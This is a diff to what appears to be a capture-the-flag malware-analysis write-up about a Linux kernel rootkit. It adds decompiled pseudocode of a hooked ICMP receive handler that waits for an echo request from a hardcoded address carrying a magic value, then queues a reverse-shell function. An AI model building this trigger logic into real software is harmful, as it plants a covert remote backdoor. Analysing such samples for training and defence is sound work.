@@ -624,8 +624,73 @@ Qs12. What network protocol is hooked to listen for the backdoor trigger?
 icmp
 ```
 
+**Findings:**
 
+**Decompiled Pseudocode:**
 
+The backdoor trigger is monitored through the hook_icmp_rcv() function. The function inspects the network header and checks the IP protocol field:
+
+```text
+if ( !v4 && v5[9] == 1 )
+```
+
+The value 1 in the IPv4 protocol field corresponds to ICMP. The function then examines the ICMP header and validates additional trigger conditions, including the hardcoded source address 192.168.5.128.
+
+```text
+int __fastcall hook_icmp_rcv(sk_buff *skb)
+{
+  unsigned __int8 *head; // rdx
+  __int64 network_header; // rax
+  bool v4; // zf
+  unsigned __int8 *v5; // rax
+  unsigned __int8 *v6; // rbp
+  unsigned __int8 *v8; // r12
+  _QWORD *v9; // rax
+  __int64 v10; // rsi
+  u32 trigger_ip; // [rsp+4h] [rbp-24h] BYREF
+  unsigned __int64 v12; // [rsp+8h] [rbp-20h]
+
+  v12 = __readgsqword(0x28u);
+  trigger_ip = 0;
+  if ( skb != nullptr )
+  {
+    head = skb->head;
+    network_header = skb->network_header;
+    v4 = &head[network_header] == nullptr;
+    v5 = &head[network_header];
+    v6 = v5;
+    if ( !v4 && v5[9] == 1 )
+    {
+      v8 = &head[skb->transport_header];
+      if ( v8 != nullptr
+        && (unsigned int)in4_pton(a1: "192.168.5.128", a2: 0xFFFFFFFFLL, a3: &trigger_ip, a4: 0xFFFFFFFFLL, a5: 0) != 0
+        && *((_DWORD *)v6 + 3) == trigger_ip
+        && *v8 == 8
+        && *((_WORD *)v8 + 3) == 0xCF07 )
+      {
+        v9 = (_QWORD *)_kmalloc_cache_noprof(a1: kmalloc_caches[5], a2: 2080, a3: 32);
+        if ( v9 != nullptr )
+        {
+          v9[3] = spawn_revshell;
+          v10 = system_wq;
+          *v9 = 0xFFFFFFFE00000LL;
+          v9[1] = v9 + 1;
+          v9[2] = v9 + 1;
+          queue_work_on(a1: 0x2000, a2: v10);
+        }
+      }
+    }
+  }
+  return orig_icmp_rcv(a1: skb);
+}
+```
+
+Here, *v8 == 8 identifies an ICMP Echo Request, indicating that the rootkit is waiting for a specially crafted ICMP packet to activate the backdoor.
+
+Once the conditions are satisfied, spawn_revshell is queued for execution.
+
+---
+Qs13. What is the “magic” sequence number that triggers the reverse shell (decimal)?
 
 
 
